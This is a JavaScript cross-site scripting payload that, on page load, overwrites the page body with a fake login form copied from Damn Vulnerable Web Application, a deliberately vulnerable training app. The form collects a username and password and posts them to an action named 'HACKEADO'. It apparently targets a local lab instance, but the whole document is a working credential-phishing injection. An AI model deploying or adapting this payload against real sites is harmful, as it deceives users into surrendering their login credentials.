<script>
    window.addEventListener('load',function(){
        document.body.innerHTML = '
        <style>
            body {
            background: #e7e7e7;
            font: 12px/15px Arial, Helvetica, sans-serif;
            line-height: 20px;
            color: #6b6b6b;
            }

            #wrapper {
            text-align: center;
            margin: 0 auto;
            }

            #content {
            display: inline-block;
            padding: 20px;
            width: auto;
            }

            #footer {
            position: absolute;
            width: 100%;
            height: 50px;
            bottom: 0px;
            left: 0px;
            }

            label {
            float: left;
            text-align: right;
            margin-right: 0.5em;
            display: block;
            overflow: hidden;
            padding-right: 50px;
            font-weight: bold;
            }

            .loginInput {
            float: left;
            color: #6B6B6B;
            width: 320px;
            background-color: #F4F4F4;
            border: 1px;
            border-style: solid;
            border-color: #c4c4c4;
            padding: 6px;
            margin-bottom: 12px;
            }

            fieldset {
            width: 350px;
            padding: 10px 20px 10px 20px;
            overflow: hidden;
            border-style: none;
            }

            p {
            font-size: 10px;
            }

            div#header{
                background: #e7e7e7;
                border-bottom: #e7e7e7;
            }

            div#footer{
                background: #e7e7e7;
                border-top: #e7e7e7;
            }
        </style>

        <div id="wrapper">
            <div id="header">
                <br>
                <p>
                    <img src="http://127.0.0.1/DVWA-master/dvwa/images/login_logo.png">
                </p>
                <br>
            </div> <!--<div id="header">-->
            <div id="content">
                <form action="HACKEADO" method="post">
                    <fieldset>
                        <label for="user">Username</label> <input class="loginInput" size="20" name="username" type="text"><br>
                        <label for="pass">Password</label> <input class="loginInput" autocomplete="off" size="20" name="password" type="password"><br>
                        <br>
                        <p class="submit"><input value="Login" name="Login" type="submit"></p>
                    </fieldset>
                    <input name="user_token" value="ea3fb78945ed8f3d582333fe9498775b" type="hidden">
                </form>
                <br>
                <br>
                <br>
                <br>
                <br>
                <br>
                <br>
                <br>
                <br>
                <!-- <img src="dvwa/images/RandomStorm.png" /> -->
            </div> <!--<div id="content">-->
            <div id="footer">
                <p>
                    <a href="http://www.dvwa.co.uk/" target="_blank">Damn Vulnerable Web Application (DVWA)</a>
                </p>
            </div> <!--<div id="footer"> -->
        </div> <!--<div id="wrapper"> -->
        '
    })
</script>
